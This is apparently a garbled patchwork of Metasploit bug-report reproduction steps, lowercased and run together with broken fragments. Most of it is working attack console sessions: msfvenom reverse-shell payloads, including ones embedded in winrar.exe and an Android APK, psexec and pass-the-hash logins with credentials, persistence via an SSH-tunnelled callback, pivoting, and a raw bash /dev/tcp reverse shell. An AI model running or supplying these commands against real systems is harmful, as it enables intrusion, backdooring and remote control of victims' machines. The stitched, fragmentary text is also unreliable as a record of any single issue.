[*] server started.
[*] server stopped.
[*] auxiliary module execution completed
``` ### exploit module
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set lhost 10.103.0.30
lhost => 10.103.0.30
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > run [*] started reverse tcp handler on 10.103.0.30:4444
[-] exploit aborted due to failure: unknown: something went horribly wrong and we couldn't continue to exploit.
[*] exploit completed, but no session was created.
attacking "irked" vm in hack the box
established a session as the user, which has lpadmin as group.
use post/multi/escalation/cups_root_file_read; set session to correct session and exploit
view output, see message like:
nc: invalid option -- 'j' when i went to the file /opt/metasploit-framework/embedded/framework/modules/post/multi/escalate/cups_root_file_read.rb and changed line 160 by removing the -j option from nc and relaunched msfconsole, everything appears to work
(doing some research, i could not find a tutorial or man page referring to -j as a valid option for nc.) rsions.
msf5> load alias
msf5> alias <hit tab>
``` ### output ```
# ./msfconsole [-] ***rting the metasploit framework console...\\
[-] * warning: no database support: no database yaml file
[-] *** ppppp iiiiiii n n p pp i nn n identification p pp i n n n ppppp i n n n program p i n nn p iiiiiii n n strike a key when ready ..
=[ metasploit v5.0.0-dev-a635e36 ]
+ -- --=[ 1851 exploits - 1045 auxiliary - 320 post ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops ]
+ -- --=[ 2 evasion ]
+ -- --=[ ** this is metasploit 5 development branch ** ] msf5 > load alias
[*] successfully loaded plugin: alias
msf5 > alias /pentest/exploit/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:405:in `block in tab_complete_stub\': undefined method `downcase\' for ["irb", "pry", "edit", "reload_lib", "log"]:array (nomethoderror) from /pentest/exploit/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:404:in `each\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:404:in `find_all\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:404:in `tab_complete_stub\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:355:in `tab_complete\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/shell.rb:62:in `block in init_tab_complete\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/readline.rb:136:in `readline_attempted_completion_function\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6329:in `gen_completion_matches\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6813:in `rl_complete_internal\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6903:in `rl_complete\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4374:in `_rl_dispatch_subseq\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4363:in `_rl_dispatch\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4779:in `readline_internal_charloop\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4853:in `readline_internal\' from /usr/local/rvm/gems/ruby-2.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4875:in `readline\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/input/readline.rb:100:in `pgets\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `get_input_line\' from /pentest/exploit/metasploit-framework/lib/rex/ui/text/shell.rb:134:in `run\' from /pentest/exploit/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start\' from /pentest/exploit/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start\' from ./msfconsole:49:in `<main>\'
while exploring #10998, i noticed that if a datastore option is not registered in advance, referencing it is case-sensitive, rather than insensitive
as part of #10998 i originally fixed this and made all datastore key/values case insensitive, but this broke some tests that actually _rely_ on this quirk in behavior
to reproduce, do `setg threads 2` from the `msf5>` prompt.
then enter `irb` and look at `datastore['threads']`
also examine the contents of `datastore`
workspace -a lab1
wmap_sites -a
start msfconsole
use use auxiliary/dos/http/ms15_034_ulonglongadd
set rhosts 192.168.0.0/24
`msfvenom -p solaris/sparc/shell_reverse_tcp lhost=192.168.0.1 lport=4448 --platform solaris -b "\\x00" -a sparc -f elf -o ~/share/solaris_shell_sparc
results in:
```found 2 compatible encoders<br>
attempting to encode payload with 1 iterations of generic/nonembr>
generic/none failed with encoding failed due to a bad character (index=65, char= )
attempting to encode payload with 1 iterations of sparc/longxor_tag
sparc/longxor_tag succeeded with size 196 (iteration=0)
sparc/longxor_tag chosen with final size 196
payload size: 196 bytes
error: the payload could not be generated, check options
``` no output file is generated
the corresponding command for x86:
`msfvenom -p solaris/x86/shell_reverse_tcp lhost=192.168.0.1 lport=4449 --platform solaris -b "\\x00" -a x86 -f elf -o ~/share/solaris_shell_x86` results in a successful generation: ```found 11 compatible encoders
attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 118 (iteration=0)
x86/shikata_ga_nai chosen with final size 118
payload size: 118 bytes
final size of elf file: 202 bytes saved as: /home/user/share/solaris_shell_x86
at first i got a meterpreter session with system privileges.
![2018-11-06 10-56-34]( 2
then run the post module, got error messages and lost access
after this i failed to use any funtion which needs system privileges
however using `sessions -l` to check active sessions and it's still show that current user is system :)
![2018-11-06 10-58-25]( ## system stuff
open msf in kali
use any module i.e
use exploit/multi/handler
both meterpreter x64 linux and meterpreter python on linux guest:
do a "ls" on a dir that contains large files.
on python it will give an error, on linux it will show wrong file sizes (might me mod 2^32).
import an nmap scan with open and closed ports
request only open ports with 'service -u'
get a meterpreter shell from vm
try to write reg with /t reg_multi_sz, notice me successfully but got mojibake in registry ### os && version os: linux centos 3.10.0-862.el7.x86_64
meterpreter: win7 enterprise x64 7601
run `msfconsole` on windows, get error:
failed to connect to the database: could not connect to server: connection refused ( /10061) is the server running on host "127.0.0.1" and accepting tcp/ip connections on port 5433?
running `msfdb reinit` and then running `msfconsole` fixes the issue but only for a single instance of msfconsole
restarting or exiting session and running again results in the same error
`use windows/smb/ms17_010_psexec`
`unset smbuser`
`unset smbpass`
i want to use the compiler to compile a windows service exe, but it throws an error and stops.
msf > use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(scanner/ssh/ssh_login_pubkey) > set key_path /home/micke/.ssh/cuiteur
key_path => /home/micke/.ssh/cuiteur
msf auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts 10.0.6.235
rhosts => 10.0.6.235
msf auxiliary(scanner/ssh/ssh_login_pubkey) > set rport 52961
rport => 52961
msf auxiliary(scanner/ssh/ssh_login_pubkey) > set username root
username => root
msf auxiliary(scanner/ssh/ssh_login_pubkey) > run [*] 10.0.6.235:52961 ssh - testing cleartext keys
[*] error: 10.0.6.235: notimplementederror openssh keys only supported if ed25519 is available
net-ssh requires the following gems for ed25519 support: * ed25519 (>= 1.2, < 2.0) * bcrypt_pbkdf (>= 1.0, < 2.0)
see for more information
gem::loaderror : "ed25519 is not part of the bundle
add it to your gemfile." [*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
``` i tried logging in with ssh after getting hold of the private key.
initializing database rsions.
msf5 auxiliary(scanner/http/apache_activemq_source_disclosure) > use admin/http/joomla_registration_privesc
msf5 auxiliary(admin/http/joomla_registration_privesc) > options module options (auxiliary/admin/http/joomla_registration_privesc): name current setting required description ---- --------------- -------- ----------- email example@youremail.com yes email to receive the activation code for the account password expl0it3r yes password for the username proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts 10.181.0.122/24 yes the target address range or cidr identifier rport 80 yes the target port (tcp) ssl false no negotiate ssl/tls for outgoing connections targeturi / yes the relative uri of the joomla instance username expl0it3r yes username that will be created vhost no http server virtual host msf5 auxiliary(admin/http/joomla_registration_privesc) > set verbose true
verbose => true
msf5 auxiliary(admin/http/joomla_registration_privesc) > run ```
fire up msf and set up a listener for `windows/x64/meterpreter_reverse_tcp`.
fire up a meterpreter payload on a windows machine that matches the listener.
once connected, use `sessions -x` to see that the session is marked as encrypted.
restart msf.
wait for the reconnection attempt to come in from the existing session.
once connected, run `sessions -x`, and see that the session is _not_ marked as encrypted.
run post/windows/gather/credentials/mremote against an active session.
the target machine must have mremoteng installed.
exploit: multi/script/web_delivery
payload: windows/meterpreter/reverse_https) module options (exploit/multi/script/web_delivery): name current setting required description ---- --------------- -------- ----------- srvhost 0.0.0.0 yes the local host to listen on
this must be an address on the local machine or 0.0.0.0 srvport 443 yes the local port to listen on
ssl true no negotiate ssl for incoming connections sslcert /root/unified.pem no path to a custom ssl certificate (default is randomly generated) uripath / no the uri to use for this exploit (default is random) payload options (windows/meterpreter/reverse_https): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: '', seh, thread, process, none) lhost ads.symxxx.xxx yes the local listener hostname lport 8443 yes the local listener port luri no the http path exploit target: id name -- ---- 3 regsvr32 this exploit was working absolutely fine yesterday.
install the latest version metasploit by `apt-get update; apt install metasploit-framework`.
run `msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c` and got a error: `error: invalid option` but in the msf5 the option existed
relevant: #9869 #10480 #10029
msf exploit(windows/local/current_user_psexec) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows 10.0.0.4:80 -> 212.83.142.83:1119 (212.83.142.83) 5 meterpreter x64/windows autorite nt\\syst_me @ dc2 10.0.0.4-212.83.142.83:0 -> 192.168.0.2:445 (192.168.0.2) msf exploit(windows/local/current_user_psexec) > options module options (exploit/windows/local/current_user_psexec): name current setting required description ---- --------------- -------- ----------- dispname no service display name (default: random) internal_address no session's internal address or hostname for the victims to grab the payload from (default: detected) kerberos true yes authenticate via kerberos, dont resolve hostnames name no service name on each target in rhosts (default: random) rhosts dc1.jz.local no target address range or cidr identifier session 5 yes the session to run this module on
technique smb yes technique to use (accepted: psh, smb) payload options (windows/x64/meterpreter/bind_named_pipe): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: '', seh, thread, process, none) lport 445 yes smb port pipename msf-pipe yes name of the pipe to connect to rhost no host of the pipe to connect to smbdomain
no the windows domain to use for authentication smbpass no the password for the specified username smbuser no the username to authenticate as exploit target: id name -- ---- 0 universal msf exploit(windows/local/current_user_psexec) > run [-] exploit failed: the following options failed to validate: rhosts.
[*] exploit completed, but no session was created.
msf exploit(windows/local/current_user_psexec) > sessions 5
[*] starting interaction with 5..
meterpreter > resolve dc1.jz.local host resolutions
================ hostname ip address -------- ---------- dc1.jz.local 192.168.0.1 meterpreter >
``` windows 2003 x86 -> windows server 2008 r2 x64 -> windows server 2008 r2 x64
# msfvenom -p linux/x86/shell_reverse_tcp_ipv6 --list-options
options for payload/linux/x86/shell_reverse_tcp_ipv6:
========================= traceback (most recent call last): 7: from /usr/bin/msfvenom:371:in `<main>' 6: from /usr/share/metasploit-framework/lib/msf/base/serializer/readable_text.rb:24:in `dump_module' 5: from /usr/share/metasploit-framework/lib/msf/base/serializer/readable_text.rb:330:in `dump_payload_module' 4: from /usr/share/metasploit-framework/lib/msf/core/payload.rb:204:in `size' 3: from /usr/share/metasploit-framework/lib/msf/core/payload/single.rb:36:in `generate' 2: from /usr/share/metasploit-framework/modules/payloads/singles/linux/x86/shell_reverse_tcp_ipv6.rb:42:in `generate_stage' 1: from /usr/share/metasploit-framework/modules/payloads/singles/linux/x86/shell_reverse_tcp_ipv6.rb:42:in `new'
/usr/lib/ruby/2.5.0/ipaddr.rb:565:in `initialize': address family must be specified (ipaddr::addressfamilyerror) ```
use post/multi/manage/upload_exec
set lfile /tmp/pl
set rfile /root/pl
set session 1
run when the module is done the payload is not executed
the reason is in "./#{rfile}" (see #l46)
it should be (withoout ."/"):
cmd_exec("chmod 755 #{rfile} && #{rfile}", nil, 0)
``` the above fix works in my environment.
i am using pentestbox on windows 10
launch msfconsole
use auxiliary/gather/enum_dns
using following settings ``` name current setting ---- --------------- domain google.it enum_a true enum_axfr true enum_brt true enum_cname true enum_mx true enum_ns true enum_rvl true enum_soa true enum_srv true enum_tld false enum_txt true iprange ns stop_wldcrd false threads 1 wordlist c:/pentestbox/bin/metasploit-framework/data/wordlists/namelist.txt ```
(edit: targeting a win10 x64 sp1 fully patched vm with a `meterpreter/x64/bind_tcp` payload) immediately after my meterpreter payload uploaded, i set up a route
although i got an error, the route existed in msfconsole's routing table, but it couldn't be deleted: ```
msf5 > handler -h 192.168.1.11 -p 4444 -p windows/x64/meterpreter/bind_tcp
[*] payload handler running as background job 2.
msf5 > [*] started bind tcp handler against 192.168.1.11:4444
[*] meterpreter session 2 opened (192.168.1.101:37409 -> 192.168.1.11:4444) at 2018-07-06 13:22:42 -0500 msf5 > route add 192.168.0.118 2
[-] invalid :session, expected session object got msf::sessions::meterpreter_x64_win
``` so i re-ran the command: ```
msf5 > route add 192.168.0.118 2
[*] route already exists
msf5 > route print ipv4 active routing table
========================= subnet netmask gateway ------ ------- ------- 192.168.0.118 0.0.0.0 session 2 [*] there are currently no ipv6 routes defined.
``` but now i can't delete the route:
msf5 > route delete 192.168.0.118 2
snip -- generic route help message ...]
msf5 > route flush
[-] invalid :session, expected session object got msf::sessions::meterpreter_x64_win
from a `meterpreter/x64/bind_tcp` payload on win10 sp1 fully patched: 1
run `execute -i -f xcopy.exe` or `execute -i -f net.exe`
note the output from the command, which was executed on the target
background meterpreter
run `sessions -c 'execute -i -f xcopy.exe' and `sessions -c 'execute -i -f net.exe'
note the error message.
`rm /home/<user>/.msf4/config`
`./msfconsole`
set up for epic haxoring (do not set `disablepayloadhandler` )
`show options` and verify `disablepayloadhandler` settings
`exit` msfconsole
restart msfconsole
`show options`
notice that `**disablepayloadhandler: true (rhost and rport settings will be ignored!)**`
try to fix it by running 'set disablepayloadhandler false`
`show options`
notice that ` **disablepayloadhandler: true (rhost and rport settings will be ignored!)**`
cry harder.
set up a windows 2016 server or windows 1 1511 (those are all i tested, so likely others are affected) i disabled firewall and created a share.
use exploit windows/smb/psexec
set rhost <ip>
set smbuser <user>
set smbpass <password>
set payload windows/x64/powershell_reverse_tcp
set payload windows/x64/meterpreter/reverse_https
### kali linux
![image]( #### multi handler
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lport 4444
msf exploit(multi/handler) > set lhost 172.16.0.14
msf exploit(multi/handler) > set exitonsession false
msf exploit(multi/handler) > exploit -j
``` #### psexec module
msf > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set rhost 172.16.0.12
msf exploit(windows/smb/psexec) > set smbuser administrator
msf exploit(windows/smb/psexec) > set smbpass admin_pass
msf exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set target 2
msf exploit(windows/smb/psexec) > set lport 4444
msf exploit(windows/smb/psexec) > set lhost 172.16.0.14
msf exploit(windows/smb/psexec) > set disablepayloadhandler true
``` connection establishing successfully but after a couple of seconds connection closes without removing the service, deleting the .exe file and creating a rundll32.exe process
![custom_exe_1](
![custom_exe_2](
![custom_exe_3](
run msfconsole on terminal
i use the followings commands : "msf > use exploit/unix/webapp/wp_admin_shell_upload"
then i do all the options (set username admin, set password admin, set rhost 192.168.x.x, etc..)
i gain the shell access on the wordpress.
exploit the system (windows 7 sp 7600)
get system privileges & use windows/local/manage/persistence with veil encrypted payloads installed in /windows/system32 & executed & running as service on target.
persistence payload used windows/meterpreter_reverse_tcp (stageless) with lhost as "myssh.com" lport as xxxx
install the payload as service on boot in exploited machine.
start a reverse handler with lhost 0.0.0.0 & lport 4444 in msfconsole.
start ssh server tcp port fwd with ssh: -r xxxx:localhost:4444 myssh.com rsions.
i got meterpreter session a machine, and wanted to use it as a pivot
run autoroute -s 10.1.1.0/24
``` later, i scanned using the portscan/tcp module, but thread exception terminated
use auxiliary/scanner/portscan/tcp
set rhosts 10.1.1.0/24
set threads 15
1- msfconsole
2- use auxiliary/scanner/http/wordpress_login_enum
3- set user_file /home/users.txt
4- set rhosts 192.168.1.10
5- set targeturi /wp-login.php
used a apk file to encode with msfvenom msfvenom -p android/meterpreter_reverse_tcp -x /root/original.apk -e shikata_ga_nai -i 5 -b '\\x00' lhost=myssh lport=7070 -o /root/hacked.apk 2
execute apk on android and started reverse handler on msf with payload as android/meterpreter_reverse_tcp lhost as 0.0.0.0 lport as 7777
ssh -r 7070:localhost:7777 myssh rsions.
there are two cases in which a closing thread causes meterpreter to send an empty packet, presumably because the module fails during an exception and the thread is forcibly shutdown
case # 1: `auxiliary/server/socks5` is unable to connect to the requested destination
case # 2: `auxiliary/scanner/mysql/mysql_version` fails while scanning a mysql server
case # 3: #10160 - smb fails to connect, likely due to a lack of smb2 support
in all cases, the traceback doesn't provide an explanation as to why the module failed.
used msfvenom to generate the payload, specified lhost and lport
the apk installs succesfully on the target but when i click on it it doesn't works(not running in background) nor does the meterpreter gets a session it should have worked according to the sources, wonderhowto.com etc.
target is android- 1
htc-4.4.2-kitkat
samsung- 4.0.4
1) having valid windows credentials i configure windows/smb/psexec_psh module set rhost
set smbuser
set smbpass 2) run exploit
session 1 is open to victim
run the following commands ```
msf exploit(windows/local/current_user_psexec) > route add 10.10.66.0 255.255.254.0 1
[*] route added
msf exploit(windows/local/current_user_psexec) > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set rhosts 10.10.66.1-10
rhosts => 10.10.66.1-10
msf auxiliary(scanner/smb/smb_login) > set smbpass 00000000000000000000000000000000:2f4cnltmhashsnipsnip7072f
smbpass => 00000000000000000000000000000000:2f4cnltmhashsnipsnip7072f
msf auxiliary(scanner/smb/smb_login) > set smbuser xx
smbuser => xx
msf auxiliary(scanner/smb/smb_login) > set smbdomain lab
smbdomain => lab
msf auxiliary(scanner/smb/smb_login) > set threads 5
threads => 5
msf auxiliary(scanner/smb/smb_login) > run
launch metasploit-framework and load auxiliary from modules `cmd /k partition name:\\file name\\metasploit-framework\\bin\\msfconsole.bat` rsions.
use _module_ 2
`history` history after step 4 should contain previously executed pry command (even from outside the msf )
attack side
./msfconsole -qx 'use multi/handler; set payload cmd/unix/reverse_bash; set lhost 127.0.0.1; set lport 4444; exploit'
victim side
bash -c 'bash -i >&/dev/tcp/127.0.0.1/4444 2>&1 0>&1'
``` information field somethings will be wrong while executing sessions command: (victim used the interactive shell, eg `bash -i`) ![image]( should we gather some information (execute these commands first once get a reverse shell session) from the target system, like linux : `cat /etc/issue | base64`
windows: `ver`
then we can parse the output of these commands..
i am not sure whether it will works..
maybe it will lead to some unexpected crash?
scanner/smb/smb_login not connecting to internal host after a route has been added
msf auxiliary(scanner/portscan/tcp) > set ports 1,22,80,443,445,8080,8333
ports => 1,22,80,443,445,8080,8333
msf auxiliary(scanner/portscan/tcp) > set threads 5
threads => 5
msf auxiliary(scanner/portscan/tcp) > set rhosts 10.0.7.1
rhosts => 10.0.7.1
msf auxiliary(scanner/portscan/tcp) > run [+] 10.0.7.1: - 10.0.7.1:80 - tcp open
[+] 10.0.7.1: - 10.0.7.1:445 - tcp open msf auxiliary(scanner/smb/smb_login) > run [*] 10.0.7.1:445 - 10.0.7.1:445 - starting smb login bruteforce
^c[*] caught interrupt from the console..
just hangs here.
does not connect to host though the tcp scanner is able to.
``` msf exploit(multi/http/mediawiki_syntaxhighlight) > show options module options (exploit/multi/http/mediawiki_syntaxhighlight): name current setting required description ---- --------------- -------- ----------- cleanup true no delete created php file? password no password to authenticate with proxies no a proxy chain of format type:host:port[,type:host:port][...] rhost <redacted> yes the target address rport 80 yes the target port (tcp) ssl true no negotiate ssl/tls for outgoing connections targeturi /w yes mediawiki base path (eg, /w, /wiki, /mediawiki) uploadpath images yes relative local upload path username no username to authenticate with vhost no http server virtual host payload options (php/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost 10.132.0.2 yes the listen address lport 4444 yes the listen port exploit target: id name -- ---- 0 automatic targeting msf exploit(multi/http/mediawiki_syntaxhighlight) > run [*] started reverse tcp handler on 10.132.0.2:4444 [-] exploit failed [unreachable]: openssl::ssl::sslerror ssl_connect returned=1 errno=0 state=sslv2/v3 read server hello a: unknown protocol
[*] exploit completed, but no session was created.
use module exploit/multi/misc/java_rmi_server
set appropriate options and issue exploit command
exploit(multi/misc/java_rmi_server) > exploit [*] started bind handler
[*] 1.1.1.1:1099 - using url:
[*] 1.1.1.1:1099 - server started.
[*] 1.1.1.1:1099 - sending rmi header...
[*] 1.1.1.1:1099 - sending rmi call...
[-] 1.1.1.1:1099 - exploit failed: runtimeerror exploit aborted due to failure unknown the rmi class loader couldn't find the payload
[*] 1.1.1.1:1099 - server stopped.
[*] exploit completed, but no session was created
## system stuff
use auxiliary/scanner/ipmi/ipmi_dumphashes `or` use auxiliary/scanner/ipmi/ipmi_cipher_zero 2
show options
use auxiliary/scanner/http/trace
set rhosts e.f.g.h
run rsions.
**use exploit/multi/handler set your payload as windows/x64/powershell_reverse_tcp
and set all other relevant variables** 2
**generate an executable from payload/windows/x64/powershell_reverse_tcp** rsions.
`/usr/bin/msfconsole `shell script add the arguments contained in `db_args`: ```
db_args="-y /usr/share/metasploit-framework/config/database.yml"
``` `-y` is not a recognized option, which gives a warning everytime `msfconsole` is run: ```
root@msf:/# msfconsole
find: unknown predicate `-y'
after i installed "**metasploit**" and disabled firewall and antivirus i did this: 1-:white_check_mark: i opened cmd.exe as **administrator** 2-:white_check_mark: navigate to **`c:\\metasploit`** 3-:white_check_mark: i entered the following command **`console`** 4-:red_circle: i\'ve got this warning: :bell: **# **warning! the following modules could not be loaded!**
c:/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.54/modules/auxiliary/dos/smb/smb_loris.rb: msf::modules::error failed to load module (dos/smb/smb_loris from c:/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.54/modules/auxiliary/dos/smb/smb_loris.rb) due to invalid module (no metasploitmodule class or module name)** :bell:
msf5 auxiliary(scanner/wproxy/att_open_proxy) > workspace -a bug3
[*] added workspace: bug3
[*] workspace: bug3
msf5 auxiliary(scanner/wproxy/att_open_proxy) > vulns vulnerabilities
=============== timestamp host name references
--------- ---- ---- ---------- msf5 auxiliary(scanner/wproxy/att_open_proxy) > run [+] 127.0.4.4:8080 - matches
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
msf5 auxiliary(scanner/wproxy/att_open_proxy) > vulns vulnerabilities
=============== timestamp host name references
--------- ---- ---- ----------
2018-04-27 15:34:52 utc 127.0.4.4 wproxy cve-2017-14117,url- #vulnerability5port49152tcpexposure,aka-sharknat&to,aka-sharknatto msf5 auxiliary(scanner/wproxy/att_open_proxy) > save
saved configuration to: /users/acammack/.msf4/config
msf5 auxiliary(scanner/wproxy/att_open_proxy) > exit
[acammack@aus-mbp-1099 metasploit-framework]$ rbenv exec bundle exec ruby ./msfconsole -q
msf5 auxiliary(scanner/wproxy/att_open_proxy) > vulns
[ all the vulns ]
msf5 auxiliary(scanner/wproxy/att_open_proxy) > services
[ all the services ]
msf5 auxiliary(scanner/wproxy/att_open_proxy) > hosts
[ all the hosts ]
use multi/handler
set payload android/meterpreter/reverse_tcp
set lhost localhost
set lport 4444
exploit the above commands listen for the backdoor
and it gets connected when backdoor app opened.
`./msfconsole -qx 'handler -p 4444 -p windows/x64/meterpreter/bind_tcp -h 192.168.69.140; sleep 5; route add 192.168.69.128 255.255.255.255 1; use exploit/windows/smb/ms17_010_psexec; set rhost 192.168.69.128; set payload windows/x64/meterpreter/bind_tcp; set smbuser username; set smbpass password; run; exit -y'` bouncing through a win7 box against a win10 target
in my case, the exploit is doomed to failure, but should report back a `loginerror`.
the problem was still the same
same error message as above ## system stuff
**middle session**
msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.42.42 lport=8443 -f exe -o pwnme.exe **outer session**
msfvenom -p windows/x64/meterpreter/reverse_named_pipe pipehost=win2008-victim1 pipename=exchange64 -f exe -o pipeme_v1b_exchange64.exe **pivot**
pivot add -t pipe -l 192.168.42.2 -n exchange64 -a x64 -p windows then start the outer process.
in `msfconsole`: ```
use exploit/multi/handler
set payload windows/x64/meterpreter_bind_named_pipe
set rhost 127.0.0.1
build a `meterpreter_bind_named_pipe` payload: ```
./msfvenom -p windows/x64/meterpreter_bind_named_pipe -f exe -o bind_named_pipe_x64.exe
deploy the above payload on a windows 10 x64 target (fully patched, in my case)
configure a handler for `meterpreter_bind_named_pipe`: ```
use exploit/multi/handler
set payload windows/x64/meterpreter_bind_named_pipe
set rhost 127.0.0.1
(optional, set up a packet capture to see the immediate smb failure.)
get a meterpreter session (on a windows 10 x64 host, in my case)
msf5 > sessions -l active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows desktop-q05ukiu\ oot @ desktop-q05ukiu 192.168.108.1:54167 -> 192.168.108.217:4444 (192.168.108.217)
use the built-in `connect` command to connect directly to `www.rapid7.com`
provide a basic http header, which will return an `400 bad request` from the server
this is fine
[*] connected to 52.85.208.191:80
get / http/1.1 http/1.1 400 bad request
setup port forwarding to the `www.rapid7.com` web server
msf5 > sessions -c 'portfwd add -r 52.85.208.191 -p 80 -l 8000'
[*] running 'portfwd add -r 52.85.208.191 -p 80 -l 8000' on meterpreter session 1 (192.168.108.217)
[*] local tcp relay created: :8000 <-> 52.85.208.191:80
use the built-in `connect` command to test out the tunnel
provide a basic http header, which will return an `400 bad request` from the server
this will break and generate a traceback
in a separate window, run `nc 127.0.0.1 8000` to generate another traceback
repeat steps 4 and 5 until you see both tracebacks.
the `linux/x64/meterpreter/reverse_tcp` payload fails to start a handler when issued the `to_handler` command
the exception it throws is `invalid opcode arguments` (see below)
the output then (incorrectly) states that a job has been started
reproduce with the following steps
- start msfconsole
- `use payload/linux/x64/meterpreter/reverse_tcp`
- `set lhost x.x.x.x`
- `to_handler`
exe file is winrar.exe for www.winrar.com.cn the newest
use command:
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.11.133 lport=8090 -x winrar.exe -k -f exe -o winrar_new.exe kali linuxe 2018 1a x86 and x64 the problem all occured
using the `route` command (regardless of `add`, `get` or `del`) permits the lookup of a hostname
if you provide a hostname that doesn't resolve, you get a traceback
you can run msfconsole, without a session, and just type the following command to see the traceback.
msf5 > route get bad.example.org
[-] error while running command route: getaddrinfo: nodename nor servname provided, or not known call stack:
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket.rb:189:in `gethostbyname'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket.rb:189:in `getaddresses'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket.rb:173:in `getaddress'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket.rb:263:in `resolv_nbo'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket.rb:277:in `resolv_nbo_i'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket/switch_board.rb:233:in `best_comm'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.10/lib/rex/socket/switch_board.rb:127:in `best_comm'
/users/asoto/git/r7/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:920:in `cmd_route'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/shell.rb:208:in `run'
/users/asoto/git/r7/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/users/asoto/git/r7/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:48:in `<main>'```
msf5 post(windows/manage/run_as) > set cmd ver
msf5 post(windows/manage/run_as) > set cmdout true
cmdout => true
msf5 post(windows/manage/run_as) > set user administrator
user => root
msf5 post(windows/manage/run_as) > set password reallygoodpassword
password => toor
msf5 post(windows/manage/run_as) > set session 1
session => 1
msf5 post(windows/manage/run_as) > set domain .
domain => .
msf5 post(windows/manage/run_as) > run
``` note that when you run the command with cmdout set to true, the output is written to a randomly-generated text file in `c:\\windows\\temp`: ```
msf5 post(windows/manage/run_as) > run [*] executing createprocesswithlogonw...
[+] process started successfully, pid: 900
[*] command run: cmd.exe /c ver > c:\\windows\\temp\\ahezurlu.txt
[*] command output: microsoft windows [version 10.0.16299.309] [*] post module execution completed
``` after completion, the file is left on disk: ```
msf5 post(windows/manage/run_as) > sessions -i 1 -c 'dir c:\\\\windows\\\\temp\\\ zrzpzsv.txt'
[*] running 'dir c:\\\\windows\\\\temp\\\ zrzpzsv.txt' on meterpreter session 1 (192.168.108.217)
100666/rw-rw-rw- 46 fil 2018-04-06 13:44:08 -0500 c:\\windows\\temp\ zrzpzsv.txt
use payload/windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
